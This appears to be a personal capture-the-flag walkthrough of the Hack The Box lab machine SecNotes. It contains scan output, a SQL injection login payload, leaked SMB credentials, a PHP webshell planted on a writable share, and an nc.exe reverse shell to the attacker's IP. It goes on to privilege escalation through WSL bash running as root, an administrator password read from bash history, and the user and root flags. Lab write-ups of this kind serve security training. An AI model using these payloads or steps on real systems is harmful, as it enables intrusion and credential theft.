SecNotes IP:10.10.10.97


rustscan:

PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack
445/tcp  open  microsoft-ds  syn-ack
8808/tcp open  ssports-bcast syn-ack



nmap:

PORT     STATE SERVICE      REASON  VERSION
80/tcp   open  http         syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds syn-ack Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h40m03s, deviation: 4h37m10s, median: 1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25086/tcp): CLEAN (Timeout)
|   Check 2 (port 28250/tcp): CLEAN (Timeout)
|   Check 3 (port 53444/udp): CLEAN (Timeout)
|   Check 4 (port 24500/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2023-01-30T06:23:00-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-30T14:22:56
|_  start_date: N/A




create a new account using ' or 1='1 as username and password
when you login with the new account all  notes are displayed

\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&


use credentials to log in to smb

smbmap -H 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&'
[+] IP: 10.10.10.97:445 Name: secnotes.htb                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        new-site                                                READ, WRITE
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/SecNotes]
└─$ smbclient -U 'tyler92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site
session setup failed: NT_STATUS_LOGON_FAILURE
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/SecNotes]
└─$ smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site                                                                                                                             1 ⨯
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 30 09:39:33 2023
  ..                                  D        0  Mon Jan 30 09:39:33 2023
  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018

                7736063 blocks of size 4096. 3380933 blocks available
smb: \> put test.txt
putting file test.txt as \test.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \> ls
  .                                   D        0  Mon Jan 30 09:41:27 2023
  ..                                  D        0  Mon Jan 30 09:41:27 2023
  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018
  test.txt                            A        5  Mon Jan 30 09:41:27 2023

                7736063 blocks of size 4096. 3381019 blocks available
smb: \> 


create a test file and try to put it on the share
visit 10.10.10.97:8808/test.txt to view the file


time for a foothold

create a php webshell containing:
<?php system($_REQUEST['cmd']); ?>

put it on the smb share

then visit http://10.10.10.97:8808/cmd.php?cmd=whoami
secnotes\tyler 


cool, it works. Now let's locate nc.exe and put it on the machine . we will use nc to create a reverse connection to out machine

start a nc listener and then navigate to :
http://10.10.10.97:8808/cmd.php?cmd=nc.exe+-e+cmd.exe+10.10.14.14+4444

get user flag: 9bc061851c3c5751141fb3c8c6d05a56

C:\Users\tyler\Desktop>type bash.lnk
type bash.lnk
L�F w������V�   �v(���  ��9P�O� �:i�+00�/C:\V1�LIWindows@       ﾋL���LI.h���&WindowsZ1�L<System32B      ﾋL���L<.p�k�System32▒Z2��LP� bash.exeB  ﾋL<��LU.�Y����bash.exe▒K-JںݜC:\Windows\System32\bash.exe"..\..\..\Windows\System32\bash.exeC:\Windows\System32�%�
                                                            �wN�▒�]N�D.��Q���`�Xsecnotesx�<sAA��㍧�o�:u��'�/�x�<sAA��㍧�o�:u��'�/�=     �Y1SPS�0��C�G����sf"=dSystem32 (C:\Windows)�1SPS��XF�L8C���&�m�q/S-1-5-21-1791094074-1363918840-4199337083-1002�1SPS0�%��G▒��`����%
        bash.exe@������
                       �)
                         Application@v(���      �i1SPS�jc(=�����O�▒�MC:\Windows\System32\bash.exe91SPS�mD��pH�H@.�=x�hH�(�bP
C:\Users\tyler\Desktop>where /R c:\ bash.exe
where /R c:\ bash.exe






c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
 
WHOAMI

C:\Users\tyler\Desktop>
C:\Users\tyler\Desktop>
C:\Users\tyler\Desktop>
C:\Users\tyler\Desktop>
C:\Users\tyler\Desktop>
C:\Users\tyler\Desktop>
C:\Users\tyler\Desktop>
C:\Users\tyler\Desktop>WHOAMI
secnotes\tyler

C:\Users\tyler\Desktop> cd c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5 
 cd c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5

c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1E7B-9B76

 Directory of c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5

06/21/2018  02:02 PM    <DIR>          .
06/21/2018  02:02 PM    <DIR>          ..
06/21/2018  02:02 PM           115,712 bash.exe
               1 File(s)        115,712 bytes
               2 Dir(s)  13,855,019,008 bytes free

c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5>bash.exe
bash.exe
mesg: ttyname failed: Inappropriate ioctl for device
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
python -c 'import pty;pty.spawn("/bin/bash")'
root@SECNOTES:~# ls -la
ls -la
total 8
drwx------ 1 root root  512 Jun 22  2018 .
drwxr-xr-x 1 root root  512 Jun 21  2018 ..
---------- 1 root root  398 Jun 22  2018 .bash_history
-rw-r--r-- 1 root root 3112 Jun 22  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem
root@SECNOTES:~# cat .bash_history
cat .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history


so we have admin credentials. We can now use winexe in order to get a connection as administrator

winexe -U '. \administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 cmd.exe
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
secnotes\administrator

C:\WINDOWS\system32>cd C:\Users
cd C:\Users


C:\Users\Administrator\Desktop>type root.txt
type root.txt
a7436b70299ecc2c0f3d9e82be058763





